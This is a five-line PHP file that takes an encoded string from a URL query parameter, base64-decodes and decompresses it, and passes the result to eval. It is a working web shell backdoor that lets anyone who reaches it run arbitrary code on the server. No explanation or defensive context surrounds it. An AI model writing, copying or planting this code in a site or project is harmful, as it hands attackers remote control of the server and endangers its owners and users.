<?php
$rscode = $_GET['code'];
$fc = gzinflate(base64_decode($rscode));
eval("?>".$fc);
?>
